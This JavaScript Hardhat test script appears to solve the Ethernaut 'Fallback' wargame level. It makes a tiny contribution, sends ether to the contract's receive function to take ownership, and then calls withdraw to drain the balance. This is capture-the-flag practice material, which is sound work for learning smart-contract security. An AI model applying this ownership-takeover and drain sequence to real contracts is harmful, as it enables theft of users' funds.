const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { ethers, waffle } = require("hardhat");
const { createChallenge, submitLevel } = require("./utils");

const abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "contribute",
    outputs: [],
    stateMutability: "payable",
    type: "function",
    payable: true,
    signature: "0xd7bb99ba",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    name: "contributions",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x42e94c90",
  },
  {
    inputs: [],
    name: "getContribution",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xf10fdf5c",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address payable",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x3ccfd60b",
  },
  {
    stateMutability: "payable",
    type: "receive",
    payable: true,
  },
];

const contractLevel = "0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB";

before(async () => {
  [eoa] = await ethers.getSigners();
  // 0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB
  challengeAddress = await createChallenge(contractLevel);
  const artifact = await artifacts.readArtifact("Fallback");
  challenge = new ethers.Contract(challengeAddress, artifact.abi, eoa);
});

it("solves the challenge", async () => {
  console.log(`running attempt...`);
  // 1) Send ether less than 0.001 to contribute
  const tx = await challenge.contribute({
    from: eoa.address,
    value: ethers.utils.parseUnits("0.0000000000001", "ether"),
  });
  const txReceipt = await tx.wait(1);

  // 2) Send ether to the fallback function
  const sendEtherTx = await eoa.sendTransaction({
    to: challengeAddress,
    value: ethers.utils.parseUnits("0.0000000000001", "ether"),
  });
  const sendEtherRt = await sendEtherTx.wait(1);

  // 3) Call the withdraw function
  const withdrawTx = await challenge.withdraw();
  const withdrawRt = await withdrawTx.wait(1);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});

module.exports.tags = ["fallback"];
